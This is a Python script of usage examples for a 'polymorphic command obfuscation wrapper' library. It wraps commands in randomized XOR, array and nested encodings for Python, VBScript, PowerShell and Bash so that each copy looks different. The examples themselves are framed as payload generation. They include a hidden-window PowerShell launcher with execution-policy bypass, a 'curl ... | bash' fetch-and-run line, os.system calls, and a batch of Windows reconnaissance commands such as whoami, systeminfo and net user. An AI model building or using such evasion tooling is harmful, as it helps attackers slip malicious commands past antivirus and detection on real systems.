#!/usr/bin/env python3
"""
Polymorphic Command Obfuscation Wrapper - Usage Examples
Demonstrates various use cases and patterns
"""

import sys
import os
from polymorphic_wrapper import (
    PolymorphicCommandEncoder,
    PolymorphicConfig,
    PolymorphicStrategy,
    create_polymorphic_wrapper,
)


def example_1_basic_wrapper():
    """Example 1: Create a basic polymorphic wrapper"""
    print("\n" + "=" * 80)
    print("EXAMPLE 1: Basic Polymorphic Wrapper Generation")
    print("=" * 80)

    command = "echo 'Hello, Polymorphic World!'"

    # Generate wrapper with 3 different encodings
    result = create_polymorphic_wrapper(
        command,
        output_format="python",
        iterations=3
    )

    print(f"\nCommand: {command}")
    print(f"Output Format: Python")
    print(f"Iterations: 3")
    print(f"\nGenerated Wrapper ({len(result['wrapper'])} bytes):\n")
    print(result["wrapper"])
    print(f"\nStatistics: {result['statistics']}")


def example_2_different_formats():
    """Example 2: Generate wrappers in different formats"""
    print("\n" + "=" * 80)
    print("EXAMPLE 2: Different Output Formats")
    print("=" * 80)

    command = "powershell.exe -NoProfile -Command Write-Host 'Polymorphic'"
    formats = ["python", "vbs", "powershell", "bash"]

    for fmt in formats:
        result = create_polymorphic_wrapper(
            command,
            output_format=fmt,
            iterations=2
        )

        print(f"\n{fmt.upper()} Format ({len(result['wrapper'])} bytes):")
        print("-" * 80)
        # Show first 300 characters
        preview = result["wrapper"][:300]
        print(preview + ("...\n" if len(result["wrapper"]) > 300 else "\n"))


def example_3_strategy_distribution():
    """Example 3: Observe polymorphic strategy distribution"""
    print("\n" + "=" * 80)
    print("EXAMPLE 3: Polymorphic Strategy Distribution")
    print("=" * 80)

    command = "test_command"
    encoder = PolymorphicCommandEncoder()

    print(f"\nEncoding same command 30 times with random strategies:\n")

    strategies_used = {}
    for i in range(30):
        payload = encoder.encode(command)
        strategy = payload["strategy"]
        strategies_used[strategy] = strategies_used.get(strategy, 0) + 1

        if (i + 1) % 10 == 0:
            print(f"{i+1:2d}. Current distribution: {strategies_used}")

    print(f"\nFinal Distribution (30 invocations):")
    print("-" * 80)
    for strategy, count in sorted(strategies_used.items(), key=lambda x: x[1], reverse=True):
        percentage = (count / 30) * 100
        bar = "█" * int(percentage / 3.3)
        print(f"{strategy:15s}: {count:2d} ({percentage:5.1f}%) {bar}")

    stats = encoder.get_statistics()
    print(f"\nStatistics: {stats}")


def example_4_custom_strategies():
    """Example 4: Use custom strategy pool"""
    print("\n" + "=" * 80)
    print("EXAMPLE 4: Custom Strategy Pool")
    print("=" * 80)

    command = "custom_strategy_test"

    # Only use these strategies
    custom_strategies = [
        PolymorphicStrategy.XOR,
        PolymorphicStrategy.NESTED_HYBRID,
        PolymorphicStrategy.ARRAY,
    ]

    config = PolymorphicConfig(strategies=custom_strategies)
    encoder = PolymorphicCommandEncoder(config)

    print(f"\nCommand: {command}")
    print(f"Custom Strategy Pool: {[s.value for s in custom_strategies]}")
    print(f"\nEncoding 15 times with custom pool:\n")

    strategies_used = {}
    for i in range(15):
        payload = encoder.encode(command)
        strategy = payload["strategy"]
        strategies_used[strategy] = strategies_used.get(strategy, 0) + 1
        print(f"{i+1:2d}. Strategy: {strategy:15s} | Encoded size: {len(payload['encoded_data']):4d}")

    print(f"\nDistribution (only custom strategies):")
    for strategy, count in sorted(strategies_used.items()):
        print(f"  {strategy}: {count} times")


def example_5_windows_payload():
    """Example 5: Generate Windows-compatible payloads"""
    print("\n" + "=" * 80)
    print("EXAMPLE 5: Windows Payload Generation")
    print("=" * 80)

    # VBScript command
    vbs_command = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Write-Host 'VBS Executed'"

    print(f"\n[VBScript] Command: {vbs_command}\n")
    vbs_result = create_polymorphic_wrapper(vbs_command, output_format="vbs", iterations=2)
    print("Generated VBScript wrapper:")
    print("-" * 80)
    print(vbs_result["wrapper"][:500] + "\n...")

    # PowerShell command
    ps_command = "Get-Process | Where-Object {$_.CPU -gt 100} | Select-Object Name, CPU"

    print(f"\n[PowerShell] Command: {ps_command}\n")
    ps_result = create_polymorphic_wrapper(ps_command, output_format="powershell", iterations=2)
    print("Generated PowerShell wrapper:")
    print("-" * 80)
    print(ps_result["wrapper"][:500] + "\n...")


def example_6_linux_payload():
    """Example 6: Generate Linux-compatible payloads"""
    print("\n" + "=" * 80)
    print("EXAMPLE 6: Linux Payload Generation")
    print("=" * 80)

    # Bash command
    bash_command = "curl http://example.com/script.sh | bash"

    print(f"\n[Bash] Command: {bash_command}\n")
    bash_result = create_polymorphic_wrapper(bash_command, output_format="bash", iterations=2)
    print("Generated Bash wrapper:")
    print("-" * 80)
    print(bash_result["wrapper"][:500] + "\n...")

    # Python command
    python_command = "import os; os.system('id')"

    print(f"\n[Python] Command: {python_command}\n")
    python_result = create_polymorphic_wrapper(python_command, output_format="python", iterations=2)
    print("Generated Python wrapper:")
    print("-" * 80)
    print(python_result["wrapper"][:500] + "\n...")


def example_7_encoding_strategies():
    """Example 7: Demonstrate each encoding strategy"""
    print("\n" + "=" * 80)
    print("EXAMPLE 7: Individual Encoding Strategies")
    print("=" * 80)

    command = "test_encoding_strategy"

    for strategy in PolymorphicStrategy:
        config = PolymorphicConfig(strategies=[strategy])
        encoder = PolymorphicCommandEncoder(config)
        payload = encoder.encode(command)

        print(f"\n{strategy.value.upper()}")
        print("-" * 80)
        print(f"Original command:  {command}")
        print(f"Original length:   {len(command)} bytes")
        print(f"Encoded data:      {payload['encoded_data'][:60]}...")
        print(f"Encoded length:    {len(payload['encoded_data'])} bytes")
        print(f"Size ratio:        {len(payload['encoded_data']) / len(command):.2f}x")

        # Show decoder
        decoder = payload["decoder_code"].split('\n')[0:3]
        print(f"Decoder snippet:")
        for line in decoder:
            if line.strip():
                print(f"  {line}")


def example_8_large_commands():
    """Example 8: Handle large commands"""
    print("\n" + "=" * 80)
    print("EXAMPLE 8: Large Command Handling")
    print("=" * 80)

    # Generate a large command
    large_command = " ".join(["command_part_{0}".format(i) for i in range(50)])

    print(f"\nLarge Command: {large_command[:60]}...")
    print(f"Command Length: {len(large_command)} bytes")

    for size_var in [1, 3, 5]:
        result = create_polymorphic_wrapper(
            large_command,
            output_format="python",
            iterations=size_var
        )

        print(f"\n{size_var} iterations:")
        print(f"  Wrapper size: {len(result['wrapper'])} bytes")
        print(f"  Strategies used: {len(result['statistics']['strategy_distribution'])} unique")


def example_9_comparison():
    """Example 9: Compare encoded sizes across strategies"""
    print("\n" + "=" * 80)
    print("EXAMPLE 9: Encoding Strategy Comparison")
    print("=" * 80)

    test_command = "powershell.exe -NoProfile -WindowStyle Hidden -Command Get-Process"

    print(f"\nCommand: {test_command}")
    print(f"Original Size: {len(test_command)} bytes\n")

    results = {}
    for strategy in PolymorphicStrategy:
        config = PolymorphicConfig(strategies=[strategy])
        encoder = PolymorphicCommandEncoder(config)
        payload = encoder.encode(test_command)
        results[strategy.value] = len(payload["encoded_data"])

    print("Encoding Size Comparison:")
    print("-" * 80)
    for strategy in sorted(results.items(), key=lambda x: x[1]):
        name, size = strategy
        ratio = size / len(test_command)
        overhead = (ratio - 1) * 100
        bar = "█" * int(overhead / 5)
        print(f"{name:15s}: {size:4d} bytes ({ratio:.2f}x overhead {overhead:5.1f}%) {bar}")


def example_10_batch_processing():
    """Example 10: Batch process multiple commands"""
    print("\n" + "=" * 80)
    print("EXAMPLE 10: Batch Processing Multiple Commands")
    print("=" * 80)

    commands = [
        "whoami",
        "ipconfig /all",
        "systeminfo",
        "tasklist /v",
        "net user",
    ]

    print(f"\nGenerating polymorphic wrappers for {len(commands)} commands\n")

    wrappers = {}
    for cmd in commands:
        result = create_polymorphic_wrapper(cmd, output_format="powershell", iterations=2)
        wrappers[cmd] = result

        print(f"Command: {cmd:20s} | Wrapper size: {len(result['wrapper']):4d} bytes")

    print(f"\nTotal wrappers generated: {len(wrappers)}")
    total_size = sum(len(w["wrapper"]) for w in wrappers.values())
    print(f"Total payload size: {total_size} bytes")


def example_11_encoder_direct_usage():
    """Example 11: Direct encoder usage for fine control"""
    print("\n" + "=" * 80)
    print("EXAMPLE 11: Direct Encoder Usage")
    print("=" * 80)

    command = "direct_encoder_test"
    encoder = PolymorphicCommandEncoder()

    print(f"\nCommand: {command}\n")
    print("Generating 5 unique payloads:\n")

    for i in range(5):
        payload = encoder.encode(command)

        print(f"{i+1}. Strategy: {payload['strategy']}")
        print(f"   Encoded: {payload['encoded_data'][:40]}...")
        print(f"   Decoder: {payload['decoder_name']}")
        print(f"   Variable: {payload['var_name']}\n")


def example_12_performance_analysis():
    """Example 12: Performance analysis"""
    print("\n" + "=" * 80)
    print("EXAMPLE 12: Performance Analysis")
    print("=" * 80)

    import time

    test_sizes = [10, 50, 100, 500, 1000]
    iterations_per_size = 100

    print(f"\nPerformance Test (iterations per size: {iterations_per_size})\n")
    print(f"Command Length | Total Time | Avg Time/cmd | Throughput")
    print("-" * 60)

    for size in test_sizes:
        command = "x" * size
        encoder = PolymorphicCommandEncoder()

        start = time.time()
        for _ in range(iterations_per_size):
            encoder.encode(command)
        elapsed = time.time() - start

        avg_time = (elapsed / iterations_per_size) * 1000  # ms
        throughput = iterations_per_size / elapsed

        print(f"{size:14d} | {elapsed:9.4f}s | {avg_time:10.4f}ms | {throughput:7.1f} cmds/s")


def run_all_examples():
    """Run all examples"""
    print("\n" + "=" * 80)
    print("POLYMORPHIC WRAPPER - COMPREHENSIVE EXAMPLES")
    print("=" * 80)

    examples = [
        ("Basic Wrapper", example_1_basic_wrapper),
        ("Different Formats", example_2_different_formats),
        ("Strategy Distribution", example_3_strategy_distribution),
        ("Custom Strategies", example_4_custom_strategies),
        ("Windows Payloads", example_5_windows_payload),
        ("Linux Payloads", example_6_linux_payload),
        ("Encoding Strategies", example_7_encoding_strategies),
        ("Large Commands", example_8_large_commands),
        ("Strategy Comparison", example_9_comparison),
        ("Batch Processing", example_10_batch_processing),
        ("Direct Encoder Usage", example_11_encoder_direct_usage),
        ("Performance Analysis", example_12_performance_analysis),
    ]

    print("\nAvailable Examples:")
    for i, (name, _) in enumerate(examples, 1):
        print(f"  {i:2d}. {name}")

    print("\nRunning all examples...\n")

    for i, (name, example_func) in enumerate(examples, 1):
        try:
            example_func()
        except Exception as e:
            print(f"\n[ERROR] Example {i} ({name}) failed: {e}\n")

    print("\n" + "=" * 80)
    print("ALL EXAMPLES COMPLETED")
    print("=" * 80)


if __name__ == "__main__":
    run_all_examples()
